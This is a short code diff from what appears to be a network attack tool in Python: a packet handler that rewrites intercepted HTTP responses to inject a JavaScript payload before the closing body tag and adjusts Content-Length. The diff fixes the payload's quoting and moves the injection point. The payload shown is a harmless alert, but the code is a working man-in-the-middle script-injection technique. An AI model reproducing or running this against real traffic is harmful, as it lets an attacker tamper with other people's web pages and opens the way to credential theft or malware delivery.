@@ -16,7 +16,7 @@ RED = Fore.RED
 RESET = Style.RESET_ALL
 BRIGHT = Style.BRIGHT
 
-JAVASCRIPT_TO_INJECT = "<script>alert('You've been pwned');</script>"
+JAVASCRIPT_TO_INJECT = "<script>alert(\"You've been pwned\");</script>"
 
 
 def process_packet(packet):
@@ -60,10 +60,10 @@ def process_packet(packet):
 
             added_text = JAVASCRIPT_TO_INJECT
             added_text_length = len(added_text)
-            # load = load.replace("<body>", "<body>" + added_text)
-
-            # if you want to inject to the end, replace the line above with this one
             load = load.replace("</body>", added_text + "</body>")
+
+            # if you want to inject to the begging, replace the line above with this one
+            # load = load.replace("<body>", "<body>" + added_text)
 
             if "Content-Length" in load:
                 content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
